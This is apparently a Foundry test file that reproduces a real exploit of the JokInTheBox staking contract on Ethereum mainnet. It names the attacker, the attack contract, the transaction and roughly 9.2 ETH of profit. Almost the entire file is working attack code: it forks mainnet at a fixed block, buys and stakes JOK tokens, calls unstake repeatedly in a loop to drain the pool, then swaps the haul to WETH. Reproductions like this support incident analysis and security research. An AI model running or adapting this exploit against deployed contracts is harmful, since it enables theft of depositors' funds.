pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Profit : ~9.2 ETH
// Attacker: https://etherscan.io/address/0xfcd4acbc55df53fbc4c9d275e3495b490635f113
// Attack Contract: https://etherscan.io/address/0x9d3425d45df30183fda059c586543dcdeb5993e6
// TX : https://etherscan.io/tx/0xe8277ef6ba8611bd12dc5a6e7ca4b984423bc0b3828159f83b466fdcf4fe054f

// GUY : https://x.com/0xNickLFranklin/status/1800355604692910571

interface IJokInTheBox is IERC20 {
    struct LockPeriod {
        bool isValid;
        uint256 bonus;
    }

    function stake(uint256 amount, uint256 lockPeriod) external;
    function unstake(uint256 stakeIndex) external;
    function validLockPeriods(uint256) external view returns(LockPeriod memory);
}

contract JokInTheBoxExploit is Test {
    IJokInTheBox jokStake_ =
        IJokInTheBox(address(0xA6447f6156EFfD23EC3b57d5edD978349E4e192d));

    IERC20 jok_ = IERC20(address(0xA728Aa2De568766E2Fa4544Ec7A77f79c0bf9F97));
    IERC20 weth_ = IERC20(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    Uni_Router_V2 router_ =
        Uni_Router_V2(
            payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D))
        );


    function setUp() public {
        vm.createSelectFork("mainnet", 20054628);
        jok_.approve(address(router_), type(uint256).max);
        jok_.approve(address(jokStake_),  type(uint256).max);
    }

    function testExploit() public {

        address[] memory path = new address[](2);
        path[0] = address(weth_); // weth
        path[1] = address(jok_); // token

        vm.deal(address(this), 0.2 ether); // flashLoan
        router_.swapExactETHForTokens{value: 0.2 ether}(
            0,
            path,
            address(this),
            block.timestamp
        );


        jokStake_.stake(jok_.balanceOf(address(this)), 1);

        vm.warp(block.timestamp + 3 days);
        while(true){
            try jokStake_.unstake(0){

            }catch{
                break;
            }
        }

        path[0] = address(jok_); // token
        path[1] = address(weth_); // weth

        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            jok_.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        weth_.transfer(address(0xdead), 0.2 ether); //repay flashloan
        emit log_named_decimal_uint("weth profit = ", weth_.balanceOf(address(this)), 18);
    }
}
